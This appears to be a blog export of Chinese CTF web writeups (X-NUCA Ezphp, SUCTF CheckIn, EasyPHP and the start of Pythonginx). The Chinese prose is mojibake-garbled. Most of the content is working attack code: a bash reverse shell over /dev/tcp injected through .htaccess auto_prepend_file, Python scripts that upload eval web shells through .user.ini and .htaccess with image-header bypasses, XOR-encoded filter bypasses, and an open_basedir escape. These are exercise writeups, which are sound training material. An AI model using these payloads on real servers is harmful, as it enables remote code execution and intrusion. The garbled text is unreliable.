<p>æ–‡ä»¶åé™åˆ¶äº†åªèƒ½æ˜¯[a-z]å’Œâ€˜.â€™ï¼Œè€Œä¸”é¢˜ç›®ç¯å¢ƒè®¾ç½®äº†åªæœ‰index.phpæ–‡ä»¶è§£æï¼Œå…¶ä»–phpæ–‡ä»¶ä¸è§£æï¼Œæœ¬æ¥æƒ³ç€ç»•è¿‡è¿™ä¸ªæ­£åˆ™å»ºç«‹ä¸€ä¸ªfl3g.phpï¼Œç”¨æ¡ä»¶ç«äº‰æ¥æ–‡ä»¶åŒ…å«ï¼Œå¥ˆä½•æ–‡ä»¶åçš„æ­£åˆ™ç»•ä¸è¿‡å»ï¼Œé‚£å°±åªèƒ½è€ƒè™‘ç»•contentçš„æ­£åˆ™äº†ï¼Œåªè¦å…³é”®å­—ä¸è¢«åŒ¹é…åˆ°å°±èƒ½è¿‡ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯æŠŠå…³é”®å­—æ‹†å¼€ï¼Œè€Œä¸”æ–°å»ºçš„phpæ–‡ä»¶éƒ½ä¸è§£æï¼Œæ‰€ä»¥é¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯å†™ä¸€ä¸ª.htaccessæ–‡ä»¶ã€‚<br>å†™.Htaccessæ–‡ä»¶çš„å›°éš¾ä¸»è¦åœ¨äºè¿‡æ»¤äº†file,on,typeä¹‹ç±»çš„ï¼Œè€Œä¸”æ–‡ä»¶åè¿½åŠ äº†\nJust one chanceï¼Œæ²¡æœ‰åŠæ³•æ³¨é‡Šçš„è¯ï¼Œhtaccessæ–‡ä»¶ä¼šå‡ºé”™ï¼Œæ‰€ä»¥æ‰€æœ‰çš„åŠŸå¤«éƒ½ç”¨åœ¨ç»•è¿‡è¿™ä¸¤ä¸ªç‚¹ä¸Šã€‚</p>
<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/cool_flag/article/details/78980097" target="_blank" rel="noopener">https://blog.csdn.net/cool_flag/article/details/78980097</a></p>
<p>åˆ©ç”¨æ·»åŠ  \ çš„æ–¹æ³•æ¥æ¢è¡Œä¹¦å†™ï¼Œåˆ©ç”¨è¿™ç§æ–¹æ³•æ¥å¤„ç†è¿‡æ»¤çš„å…³é”®å­—ï¼Œè¾“å‡ºçš„ä»£ç æ°å¥½ä¼šæœ‰ä¸å¯è§å­—ç¬¦ï¼Œæ­£åˆ™åŒ¹é…çš„æ—¶å€™æ˜¯åˆ†å¼€çš„ï¼Œè€Œé€»è¾‘ä¸Šåˆæ˜¯ä¸€è¡Œæ‹¼æ¥åœ¨ä¸€èµ·çš„ä¸€ä¸ªå®Œæ•´çš„å…³é”®å­—ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡è¿‡æ»¤ï¼Œä¾‹å¦‚fileå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ç»•è¿‡</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">Fi\</span><br><span class="line"><span class="keyword">Le</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡contentçš„å†…å®¹é™åˆ¶ï¼Œè€Œå¯¹äº\nJust one chanceä¹Ÿæ˜¯åˆ©ç”¨åŒæ ·çš„ç»•è¿‡æ–¹æ³•ï¼Œåœ¨å†…å®¹æœ«å°¾åŠ ä¸Š#\æ¥æ³¨é‡Šåé¢çš„å†…å®¹ã€‚åªæœ‰ä¸€æ¬¡å†™çš„æœºä¼šè‡ªç„¶ä¸èƒ½ç”¨AddType application/x-httpd-php .xxxçš„æ–¹å¼ï¼Œè¿™æ ·éœ€è¦å†å†™ä¸€ä¸ªæ–‡ä»¶è¿›å»ã€‚<br>å‚è€ƒæ–‡ç« ï¼š<a href="https://bbs.pediy.com/thread-222907.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222907.htm</a>ï¼Œå°†ä»£ç å†™åœ¨htaccessæ–‡ä»¶é‡Œï¼Œåˆ©ç”¨php_value auto_prepend_file .htaccessè®©phpæ–‡ä»¶åŒ…å«htaccessæ–‡ä»¶ï¼Œhtaccessé‡Œçš„ä»£ç ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥ç›´æ¥ç”¨åå¼¹shellçš„æ–¹å¼ç®€å•ç²—æš´ä¸€äº›ï¼Œå¯ä»¥ä»¥åˆ©ç”¨404ã€403ç­‰é¡µé¢æ¥è§¦å‘ã€‚</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = 'http://<span class="number">02</span>cdf<span class="number">9</span>ef<span class="number">40</span>d<span class="number">440</span>d<span class="number">1</span>bd<span class="number">0</span>ba<span class="number">727</span>da<span class="number">4</span>b<span class="number">348</span><span class="keyword">c</span><span class="number">21</span>ce<span class="number">0e526</span>eea<span class="number">4</span>fad.changame.ichunqiu.com/'</span><br><span class="line">payload = '?filename=.htaccess&amp;content=php_value<span class="symbol">%20</span>auto_prepend_fi\\<span class="symbol">%0</span>Ale<span class="symbol">%20</span><span class="string">".htaccess"</span>\n<span class="symbol">%23</span>&lt;?php system(\'bash -<span class="keyword">c</span> <span class="string">"/bin/bash -i &gt;%26 /dev/tcp/ip/port 0&lt;%261"</span>\')<span class="comment">;?&gt;\\'</span></span><br><span class="line"><span class="comment">url2 = url + payload</span></span><br><span class="line"><span class="comment">r = requests.get(url2)</span></span><br><span class="line"><span class="comment">req = request.get(url)</span></span><br></pre></td></tr></table></figure>
<p>vpssä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œè·‘ä¸‹è„šæœ¬å°±å¯ä»¥æ”¶åˆ°åå¼¹å›æ¥çš„shellï¼Œæ¥ä¸‹æ¥æ‰¾flagå°±å¥½äº†ï¼Œæ²¡æƒ³åˆ°çš„æ˜¯ç«Ÿç„¶æ”¾åœ¨/root/ä¸‹â€¦â€¦</p>
<p><img src="/2019/08/25/2019-Xnuca-Ezphp-WP/8418106-1ccd692d906d1332.png" alt></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 SUCTF Web writeup</title>
    <url>/2019/08/19/2019-SUCTF-Web-writeup/</url>
    <content><![CDATA[<p><strong>è¿™æ¬¡æ¯”èµ›æ»‘æ°´äº†ï¼Œåªæœ‰ä¸­åˆå’Œæ™šä¸Šæœ‰æ—¶é—´çœ‹é¢˜ï¼Œéƒ½æ˜¯å¤§ä½¬ä»¬å¸¦ç€é£çš„ï¼Œè®°å½•ä¸‹éƒ¨åˆ†Webçš„è§£é¢˜æ€è·¯</strong></p>
<h3 id="0x01-CheckIn"><a href="#0x01-CheckIn" class="headerlink" title="0x01 CheckIn"></a>0x01 CheckIn</h3><p>è¿™é¢˜åœ¨å›½èµ›çš„åä¸œåŒ—åŒºåŠå†³èµ›å‡ºç°è¿‡ï¼Œå½“æ—¶çš„æœåŠ¡å™¨ç¯å¢ƒæ˜¯apache + phpï¼Œæ‰€ä»¥è§£æ³•æ˜¯ä¸Šä¼ .htaccesså’Œé‡Œé¢ç”¨base64åè®®æ¥è§£æä¸Šä¼ çš„é©¬ã€‚</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">#.htacess</span><br><span class="line">\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>     #ç”¨æ¥ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹</span><br><span class="line">AddType application/<span class="keyword">x</span>-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/uploads/[md5(ip)]/shell.jpg"</span></span><br></pre></td></tr></table></figure>
<p>ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹è¿˜å¯ä»¥ç”¨</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 1337</span></span><br></pre></td></tr></table></figure>

<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">#shell.jpg</span><br><span class="line">\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span></span><br><span class="line">ç®€å•çš„ä¸€å¥è¯æœ¨é©¬base<span class="number">64</span>ç¼–ç å°±å¥½äº†</span><br></pre></td></tr></table></figure>
<p>ä¸è¿‡è¿™é‡Œæ˜¯nginxç¯å¢ƒï¼Œ.htaccesså°±ç”¨ä¸ä¸Šäº†ï¼Œæ‰€ä»¥å°±æ˜¯è¦æ‰¾ä¸€ä¸ªnginxä¸­ç±»ä¼¼äº.htaccessçš„é…ç½®æ–‡ä»¶æ¥è®¾ç½®è§£æï¼Œåˆšå¥½nginxä¸Šæœ‰ä¸€ä¸ª.user.iniæ–‡ä»¶ï¼Œå‚è€ƒï¼š<a href="http://www.mumaasp.com/222.html" target="_blank" rel="noopener">http://www.mumaasp.com/222.html</a><br>.user.ini</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span></span><br><span class="line">auto_prepend_file = <span class="keyword">cc</span>.jpg</span><br></pre></td></tr></table></figure>
<p>cc.jpgç»•è¿‡&lt;?çš„è¿‡æ»¤</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span></span><br><span class="line">&lt;script language='php'&gt;eval($_REQUEST[<span class="keyword">c</span>])<span class="comment">;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">#php5ç¯å¢ƒä¸‹å¯ç”¨</span></span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ åindex.phpä¼šé»˜è®¤åŒ…å«äº†ä¸€å¥è¯æœ¨é©¬ï¼Œæ‰€ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤å°±å¥½äº†</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-51f84b72837ec29d.png" alt></p>
<p>è´´ä¸€ä¸‹ä¸Šä¼ çš„è„šæœ¬</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9021/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">userini = b<span class="string">""</span><span class="string">"\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">auto_prepend_file = cc.jpg</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"&lt;?php eval($_GET['c']);?&gt;")</span></span><br><span class="line">shell =  b<span class="string">"\x00\x00\x8a\x39\x8a\x39"</span>+b<span class="string">"00"</span> + <span class="string">"&lt;script language='php'&gt;eval(<span class="variable">$_REQUEST</span>[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'.user.ini'</span>,userini,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"upload .user.ini"</span>)</span><br><span class="line">r = requests.post(<span class="attribute">url</span>=url, <span class="attribute">data</span>=data, <span class="attribute">files</span>=files)#proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(r.text) </span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"upload cc.jpg"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'cc.jpg'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(<span class="attribute">url</span>=url, <span class="attribute">data</span>=data, <span class="attribute">files</span>=files)</span><br><span class="line"><span class="builtin-name">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<h3 id="0x02-EasyPHP"><a href="#0x02-EasyPHP" class="headerlink" title="0x02 EasyPHP"></a>0x02 EasyPHP</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é¢˜ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œç¬¬ä¸€éƒ¨åˆ†ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒéƒ¨åˆ†å°±æ˜¯get_the_flagå‡½æ•°ï¼Œæ‰€ä»¥ä¹Ÿå°±åˆ†æˆä¸¤éƒ¨åˆ†å‡ºæ¥è§£é¢˜ï¼Œæ—¢ç„¶é¢˜ç›®ç›´æ¥ç»™äº†evalï¼Œè¿˜å„ç§é™åˆ¶ï¼Œé‚£ä¹ˆæƒ³è¦çªç ´é™åˆ¶ç›´æ¥getshellä¼°è®¡ä¸å¯è¡Œï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯çªç ´é™åˆ¶è°ƒç”¨get_the_flagå‡½æ•°ï¼Œç»•åé€šè¿‡ç¬¬äºŒéƒ¨åˆ†æ¥getshellã€‚<br>ç¬¬ä¸€éƒ¨åˆ†å‚è€ƒï¼š<a href="https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU%20CTF%202019%20Quals/web/easyphp.md" target="_blank" rel="noopener">https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU%20CTF%202019%20Quals/web/easyphp.md</a><br>æ˜¾ç„¶ç°åœ¨çš„æ­£åˆ™ä¸¥æ ¼äº†ç‰¹åˆ«å¤šï¼Œè€Œä¸”è¿˜åšäº†å­—ç¬¦é•¿åº¦çš„é™åˆ¶ï¼Œä¸è¿‡åˆ©ç”¨æ–¹å¼åº”è¯¥æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯é€šè¿‡å¼‚æˆ–çš„æ–¹æ³•æ¥æ„é€ å‡ºæˆ‘ä»¬éœ€è¦çš„phpä»£ç ï¼Œå› ä¸ºå­—ç¬¦é•¿åº¦çš„é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºä¸€ä¸ª$_GET[x]å‡ºæ¥ï¼Œç»•ååˆ©ç”¨phpè¯­æ³•è§£æ${$_GET[x]}ï¼Œé€šè¿‡å‚æ•°xæ¥è§¦å‘get_the_flagå‡½æ•°ã€‚<br>é¦–å…ˆfuzzå‡ºæˆ‘ä»¬å½“å‰å¯è§çš„å­—ç¬¦æœ‰</p>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"># ; ! $ % ( ) * + - / : <span class="tag">&lt; &gt;</span> ? @ \ ] ^ </span><span class="template-variable">&#123; &#125;</span></span><br></pre></td></tr></table></figure>
<p>fuzzè„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($ascii))) &#123;</span><br><span class="line">		<span class="keyword">echo</span> bin2hex(chr($ascii));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥å°±æ˜¯ç”¨è¿™äº›å­—ç¬¦æ¥å¼‚æˆ–ï¼Œå¼‚æˆ–å‡º$_GETå³å¯,è¿™é‡Œå°±ä¸è´´FUZZå¼‚æˆ–çš„è„šæœ¬äº†</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%fe%fe%fe%fe^%a1%b9%bb%aa   -&gt; $_GET</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ‹¼æ¥å‚æ•°ä»€ä¹ˆçš„,åŒæ—¶è¦è€ƒè™‘è¿‡</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æœ€åæ‹¼æ¥å‡ºæ¥çš„å°±æ˜¯</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe^<span class="meta">%</span>a<span class="number">1</span><span class="meta">%</span>b<span class="number">9</span><span class="meta">%</span>bb<span class="meta">%</span>aa&#125;&#123;<span class="meta">%</span>fe&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>fe=get_the_flag</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯ç¬¬äºŒéƒ¨åˆ†äº†ï¼Œç¬¬äºŒéƒ¨åˆ†åœ¨XMANçš„ä¸ªäººèµ›ä¸­å‡ºç°è¿‡ï¼Œå…¶å®ä¹Ÿå’Œç¬¬ä¸€é¢˜æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯è¿™æ¬¡åˆšå¥½å°±æ˜¯apache+phpç¯å¢ƒäº†ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ç¬¬ä¸€é¢˜ä¸­æåˆ°çš„è„šæœ¬æ‰“ä¸ªshellå°±å¥½äº†ï¼Œè´´ä¸ªè„šæœ¬</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9001/?_=<span class="subst">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;</span>&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = b<span class="string">""</span><span class="string">"\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .cc</span></span><br><span class="line"><span class="string">php_value auto_append_file "</span>php:<span class="regexp">//filter</span><span class="regexp">/convert.base64-decode/resource</span>=<span class="regexp">/var/www</span><span class="regexp">/html/upload</span><span class="regexp">/tmp_95edeac63aff85469e0ebd216f87ce5a/shell</span>.cc<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line"></span><br><span class="line">shell = b<span class="string">"\x00\x00\x8a\x39\x8a\x39"</span>+b<span class="string">"00"</span>+ base64.b64encode(b<span class="string">"&lt;?php eval($_GET['c']);?&gt;"</span>)</span><br><span class="line"><span class="comment">#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files)<span class="comment">#proxies=proxies)</span></span><br><span class="line"><span class="keyword">print</span>(r.text) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'shell.cc'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-2d83561c934fa626.png" alt></p>
<p>ä¸è¿‡è¿™é¢˜åšäº†ä¸ªopen_basedirï¼Œåˆšå¥½DE1CTFçš„æ—¶å€™ç”¨äº†ä¸€æ¬¡ï¼Œå‚è€ƒï¼š<a href="https://xz.aliyun.com/t/4720ï¼Œpayload" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720ï¼Œpayload</a>:</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'img'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">print_r</span>(scandir(<span class="string">'/'</span>));</span><br><span class="line">#ç»•åç”¨<span class="selector-tag">file_get_contents</span>è¯»å°±å¥½äº†</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-9cb9d7e7d961c49d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="å›¾ç‰‡.png"></p>
<h3 id="0x03-Pythonginx"><a href="#0x03-Pythonginx" class="headerlink" title="0x03 Pythonginx"></a>0x03 Pythonginx</h3><p>é¢˜ç›®æºç (è¯»æ¥çš„)ï¼š</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, Blueprint, request, Response, escape ,render_template</span><br><span class="line">from urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit, unquote</span><br><span class="line">from urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta"># Index</span></span><br><span class="line">@app.route(<span class="string">'/'</span>, methods=[<span class="string">'GET'</span>])</span><br><span class="line">def app_index():<span class="type"></span></span><br><span class="line"><span class="type">    return render_template</span>(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/getUrl'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def getUrl():<span class="type"></span></span><br><span class="line"><span class="type">    url </span>= request.args.<span class="keyword">get</span>(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:<span class="type"></span></span><br><span class="line"><span class="type">        return </span>"æˆ‘æ‰Œ your problem? <span class="number">111</span><span class="string">"</span></span><br><span class="line"><span class="string">    parts = list(urlsplit(url))</span></span><br><span class="line"><span class="string">    host = parts[1]</span></span><br><span class="line"><span class="string">    if host == 'suctf.cc':</span></span><br><span class="line"><span class="string">        return "</span>æˆ‘æ‰Œ your problem? <span class="number">222</span> <span class="string">" + host</span></span><br><span class="line"><span class="string">    newhost = []</span></span><br><span class="line"><span class="string">    for h in host.split('.'):</span></span><br><span class="line"><span class="string">        newhost.append(h.encode('idna').decode('utf-8'))</span></span><br><span class="line"><span class="string">    parts[1] = '.'.join(newhost)</span></span><br><span class="line"><span class="string">    #å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line"><span class="string">    finalUrl = urlunsplit(parts).split(' ')[0]</span></span><br><span class="line"><span class="string">    host = parse.urlparse(finalUrl).hostname</span></span><br><span class="line"><span class="string">    if host == 'suctf.cc':</span></span><br><span class="line"><span class="string">        return urllib.request.urlopen(finalUrl).read()</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return "</span>æˆ‘æ‰Œ your problem? <span class="number">333</span><span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == "</span>__main__<span class="string">":</span></span><br><span class="line"><span class="string">    app.run(host='0.0.0.0', port=80)</span></span><br></pre></td></tr></table></figure>

